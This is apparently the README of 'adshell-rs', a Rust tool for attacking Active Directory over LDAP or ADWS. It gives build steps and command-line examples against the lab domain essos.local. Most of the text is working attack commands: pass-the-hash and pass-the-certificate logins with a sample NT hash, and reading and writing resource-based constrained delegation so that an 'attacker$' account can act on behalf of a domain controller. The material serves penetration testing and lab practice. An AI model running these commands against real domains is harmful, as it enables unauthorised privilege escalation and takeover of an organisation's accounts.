<hr />

- [How to compile it?](#how-to-compile-it)
- [Usage](#usage)
  - [Transport](#transport)
  - [Authentication](#authentication)
  - [Actions](#actions)

<hr />

# How to compile it?

`adshell-rs` depends on [`adws`](https://github.com/g0h4n/adws) as a path dependency.

```bash
# Release binary (from the adshell-rs/ directory)
cargo build --release
# Binary: ./target/release/adshell-rs

# Debug + tests
cargo build
cargo test
```

`adshell-rs` shares the `sspi` 0.16.x / `picky` rc.17 pin with `adws` and with `ldap3`'s `ntlm` feature, so a single `sspi` resolves across the tree.

# Usage

```bash
adshell-rs [OPTIONS] --domain <domain> --action <action>
```

## Transport

`-t, --transport ldap|soap` selects the wire (default `ldap`; `soap` and `adws`
are aliases, case-insensitive). Every action runs identically over either one.

```bash
# LDAP (default)
adshell-rs -d essos.local -u daenerys.targaryen -p 'BurnThemAll!' --action whoami

# ADWS / SOAP (tcp/9389)
adshell-rs -d essos.local -u daenerys.targaryen -p 'BurnThemAll!' -t soap \
    --action read_rbcd --delegate-to DC01$

# ADWS on a non-default port (tunnel/SOCKS): --ldapport sets the ADWS port
adshell-rs -d essos.local -u daenerys.targaryen -p 'BurnThemAll!' -t soap -P 9389 \
    --action read_rbcd --delegate-to DC01$
```

## Authentication

| Method | Flag(s) | LDAP | ADWS |
| ------ | ------- | ---- | ---- |
| Password | `-u` + `-p` | yes | yes |
| Pass-the-Hash (NTLM) | `-u` + `-H <nthash>` | yes | yes |
| Pass-the-Certificate (Schannel) | `--pfx` / `--crt` + `--key` (`--ldaps` for 636) | yes | - |
| Kerberos (ccache) | `-k` (`KRB5CCNAME`) | planned | - |

```bash
# Password
adshell-rs -d essos.local -u daenerys.targaryen -p 'BurnThemAll!' --action whoami

# Pass-the-hash (NTLM) - accepts NTHASH, :NTHASH or LMHASH:NTHASH
adshell-rs -d essos.local -u administrator -H e02bc503339d51f71d913c245d35b50b --action whoami

# Pass-the-Certificate over LDAPS (LDAP transport only)
adshell-rs -d ESSOS.LOCAL -f MEEREEN.ESSOS.LOCAL --crt user.crt --key user.key --ldaps --action whoami
```

## Actions

`--action` selects the operation (default `whoami`). Implemented so far:

| Action | Description | Example |
| ------ | ----------- | ------- |
| `whoami` | Confirm the authenticated identity (RFC 4532, LDAP). | `--action whoami` |
| `read_rbcd` | List accounts allowed to act on behalf of `--delegate-to`. | `--action read_rbcd --delegate-to DC01$` |
| `write_rbcd` | Allow `--delegate-from` to act on behalf of `--delegate-to`. | `--action write_rbcd --delegate-to DC01$ --delegate-from attacker$` |
| `flush_rbcd` | Remove the RBCD attribute from `--delegate-to`. | `--action flush_rbcd --delegate-to DC01$` |

RBCD works identically over LDAP and ADWS - add `-t soap` to any of the above to
run it over ADWS:

```bash
# Write RBCD over ADWS with pass-the-hash
adshell-rs -d essos.local -u administrator -H <nthash> -t soap \
    --action write_rbcd --delegate-to DC01$ --delegate-from attacker$
```

More actions (`ldapshell`, `add_computer`, `modify_user`, shadow credentials,
`read_object`, …) are on the [ROADMAP](ROADMAP.md).
